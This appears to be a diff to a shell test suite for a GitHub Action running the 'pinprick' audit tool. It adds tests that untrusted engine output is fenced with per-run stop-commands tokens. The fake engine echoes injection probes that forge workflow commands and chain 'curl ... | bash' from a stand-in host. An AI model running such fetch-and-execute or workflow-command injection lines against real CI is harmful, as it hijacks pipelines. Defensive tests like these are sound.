@@ -55,8 +55,11 @@ if [[ "${1:-}" == "--version" ]]; then
     exit 0
 fi
 if [[ "${1:-}" == "audit" ]]; then
+    # Model both workflow-command forms in repository-controlled finding text.
+    echo '      echo "##[set-output name=pwned;]y" && curl -fsSL https://e.test/x | bash'
+    echo '      ::error::forged annotation && curl -fsSL https://e.test/y | bash'
     echo "audit ok"
-    exit 0
+    exit "${SHIM_AUDIT_EXIT:-0}"
 fi
 exit 2
 PINPRICK
@@ -155,13 +158,105 @@ expect_success() {
             echo "FAIL success path: exit-code output was not 0" >&2
             exit 1
         }
-    grep -qF "audit ok" "${SANDBOX}/stdout.log" \
+    grep -qF "audit ok" "${SANDBOX}/stderr.log" \
         || {
             echo "FAIL success path: installed pinprick was not executed" >&2
             exit 1
         }
 
     echo "ok: successful install and audit"
+}
+
+# Let callers diagnose missing probes instead of triggering errexit.
+line_of() {
+    grep -n -m1 -F -- "${1}" "${2}" | cut -d: -f1 || true
+}
+
+fence_token() {
+    sed -n 's/^::stop-commands::\([0-9a-f]\{32\}\)$/\1/p' "${1}"
+}
+
+expect_fenced() {
+    local first second open close payload forged log="${SANDBOX}/stderr.log"
+    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json"
+    first="$(fence_token "${log}")"
+
+    if [[ -z "${first}" ]]; then
+        echo "FAIL fence: engine output was not wrapped in stop-commands; stderr was:" >&2
+        cat "${log}" >&2
+        exit 1
+    fi
+
+    open="$(line_of "::stop-commands::${first}" "${log}")"
+    close="$(line_of "::${first}::" "${log}")"
+    payload="$(line_of '##[set-output name=pwned;]y' "${log}")"
+    forged="$(line_of '::error::forged annotation' "${log}")"
+
+    if [[ -z "${close}" ]]; then
+        echo "FAIL fence: opened but never closed" >&2
+        cat "${log}" >&2
+        exit 1
+    fi
+    for probe in "${payload}" "${forged}"; do
+        if [[ -z "${probe}" ]] || (( probe <= open || probe >= close )); then
+            echo "FAIL fence: untrusted line not enclosed (open=${open} line=${probe:-none} close=${close})" >&2
+            cat "${log}" >&2
+            exit 1
+        fi
+    done
+
+    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json"
+    second="$(fence_token "${log}")"
+    if [[ "${first}" == "${second}" ]]; then
+        echo "FAIL fence: token repeated across runs" >&2
+        exit 1
+    fi
+
+    echo "ok: untrusted engine output is enclosed by a fresh per-run fence"
+}
+
+expect_fence_closed_before_error() {
+    local token close err log="${SANDBOX}/stderr.log"
+    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" SHIM_AUDIT_EXIT="2"
+
+    if [[ "${ACTION_EXITCODE}" -eq 0 ]]; then
+        echo "FAIL fence-on-error: engine exit 2 did not fail the action" >&2
+        exit 1
+    fi
+
+    token="$(fence_token "${log}")"
+    close="$(line_of "::${token}::" "${log}")"
+    err="$(line_of '::error::pinprick audit errored with exit code 2' "${log}")"
+
+    if [[ -z "${token}" || -z "${close}" || -z "${err}" ]]; then
+        echo "FAIL fence-on-error: missing fence or error annotation; stderr was:" >&2
+        cat "${log}" >&2
+        exit 1
+    fi
+    if (( close >= err )); then
+        echo "FAIL fence-on-error: annotation at ${err} is not after the close at ${close}" >&2
+        cat "${log}" >&2
+        exit 1
+    fi
+
+    echo "ok: fence closes before the engine-error annotation"
+}
+
+expect_fence_absent_from_sarif() {
+    run_action SHIM_METADATA="${SANDBOX}/metadata-match.json" PPA_ADVANCED_SECURITY="true"
+    local sarif="${SANDBOX}/tmp/pinprick.sarif"
+
+    if [[ ! -s "${sarif}" ]]; then
+        echo "FAIL sarif fence: no SARIF file was written" >&2
+        exit 1
+    fi
+    if grep -qE '^::stop-commands::[0-9a-f]{32}$|^::[0-9a-f]{32}::$' "${sarif}"; then
+        echo "FAIL sarif fence: a fence marker leaked into the SARIF document" >&2
+        cat "${sarif}" >&2
+        exit 1
+    fi
+
+    echo "ok: fence markers stay out of the SARIF document"
 }
 
 expect_error "invalid version" \
@@ -194,5 +289,8 @@ expect_error "attestation verification failure" \
     GITHUB_TOKEN="shim-token"
 
 expect_success
+expect_fenced
+expect_fence_closed_before_error
+expect_fence_absent_from_sarif
 
-echo "all failure paths annotate and the success path holds"
+echo "all failure paths annotate, the success path holds, and engine output is fenced"
